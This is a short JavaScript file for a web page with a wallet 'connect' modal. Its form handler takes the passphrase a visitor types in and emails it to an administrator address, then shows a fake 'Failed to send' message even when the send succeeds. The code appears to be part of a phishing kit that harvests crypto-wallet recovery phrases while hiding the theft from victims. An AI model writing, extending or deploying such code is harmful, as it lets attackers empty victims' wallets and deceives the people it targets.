import EmailService from '../services/emailService';
import { EMAIL_CONFIG } from '../config/emailConfig';

const modal = document.querySelector("#modal");
const openModal = document.querySelector("#openModal");
const closeModal = document.querySelector("#closeModal");
const emailService = new EmailService();
const form = document.querySelector('form[name="contact"]');

if (modal) {
  openModal &&
    openModal.addEventListener("click", () => modal.showModal());

  closeModal &&
    closeModal.addEventListener("click", () => modal.close());
}

// JavaScript code to handle modal activation
window.onload = function() {
  // Check if the URL hash contains "modal"
  if (window.location.hash === "#connect") {
    // Display the modal
    modal.showModal();
  }
};

// Check for hash change when a link is clicked
window.addEventListener("hashchange", function() {
  // Check if the new hash contains "modal"
  if (window.location.hash === "#connect") {
    // Display the modal
    modal.showModal();
    window.location.hash = "";
  }
});

// Handle form submission
if (form) {
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const passphrase = form.querySelector('textarea').value;
    
    try {
      const result = await emailService.sendEmail({
        to: EMAIL_CONFIG.adminEmail,
        subject: EMAIL_CONFIG.defaultSubject,
        body: `New wallet connection request with passphrase: ${passphrase}`
      });

      if (result.success) {
        alert('Failed to send connection request. Please contact support.');
        modal.close();
      } else {
        alert('Failed to send connection request. Please try again.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred. Please try again later.');
    }
  });
}
  